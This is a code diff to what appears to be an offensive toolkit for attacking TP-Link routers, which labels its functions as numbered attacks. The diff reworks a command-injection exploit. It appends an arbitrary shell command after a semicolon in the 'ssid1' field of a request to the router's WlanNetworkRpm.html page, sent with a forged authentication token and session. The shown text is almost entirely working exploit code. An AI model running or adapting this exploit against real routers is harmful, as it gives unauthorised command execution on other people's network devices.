@@ -329,6 +329,9 @@ def lightshow(target_url: str, password: str):
             time.sleep(0.1)
 
 
+# Attack 6 - Command injection
+
+
 def command_injection(target_url: str, password: str, command: str) -> None:
     print(f"[*] Executing {command} on TP-Link router")
     token = generate_tp_link_auth_token(password)
@@ -341,17 +344,36 @@ def command_injection(target_url: str, password: str, command: str) -> None:
         "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
     }
 
+    params = {
+        "ssid1": "INL" + str(random.randint(0, 50)) + "; " + command,
+        "ssid2": "TP-LINK_0000_2",
+        "ssid3": "TP-LINK_0000_3",
+        "ssid4": "TP-LINK_0000_4",
+        "region": "101",
+        "band": "0",
+        "mode": "6",
+        "chanWidth": "2",
+        "channel": "15",
+        "rate": "59",
+        "ap": "1",
+        "broadcast": "2",
+        "addrType": "1",
+        "keytype": "1",
+        "authtype": "1",
+        "keytext": "",
+        "Save": "Save",
+    }
+
     try:
+        vulnerable_endpoint = target_url + session_id + "/userRpm/WlanNetworkRpm.html"
         response = requests.get(
-            target_url
-            + session_id
-            + "/userRpm/WlanNetworkRpm.html?ssid=;"
-            + command
-            + ";&ssid2=TP-LINK_0000_2&ssid3=TP-LINK_0000_3&ssid4=TP-LINK_0000_4&region=101&band=0&mode=5&chanWidth=1&channel=9&rate=59&ap=1&broadcast=2&brlssid=&brlbssid=&addrType=1&keytype=1&wepindex=1&authtype=1&keytext=&Save=Save",
+            vulnerable_endpoint,
+            params=params,
             cookies=session_cookie,
             headers=headers,
+            timeout=5000,
         )
-        print(f"[+] Command executed successfully!")
+        print("payload sent: ", response.request.path_url)
     except requests.exceptions.RequestException as e:
         print(f"[!] Connection error: {e}")
 
